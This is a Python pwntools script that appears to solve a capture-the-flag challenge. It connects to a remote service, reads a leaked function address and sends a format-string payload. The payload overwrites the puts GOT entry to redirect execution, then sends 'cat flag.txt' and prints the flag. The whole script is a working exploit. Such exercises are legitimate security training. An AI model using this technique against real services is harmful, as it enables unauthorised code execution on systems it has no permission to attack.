from pwn import *

context(os='linux', arch='i386', bits=32)

puts_got_addr = 0x0804c014
offset = 7
p = remote('194.31.53.241', 20000)

# winner
p.recvuntil(b'0x')
winner_addr = int(b'0x' + p.recvline().strip(), 16)
log.info(f"winner: {hex(winner_addr)}")

# use fmstr from pwn
writes = {puts_got_addr: winner_addr}
payload = fmtstr_payload(offset, writes, write_size='short') 

p.recvuntil(b'Compliment Tanknight : ')
print(payload)
p.sendline(payload)
log.success("Payload utama terkirim!")

# avoiding race condition bcs of alarm
sleep(0.2)

p.sendline(b"cat flag.txt")
try:
    flag = p.recvall(timeout=0.5).decode(errors='ignore')
    log.success("flag :")
    clean_flag = flag.replace("Thanks!", "").strip()
    print(clean_flag)
except EOFError:
    log.warning("Koneksi ditutup lebih awal.")

p.close()

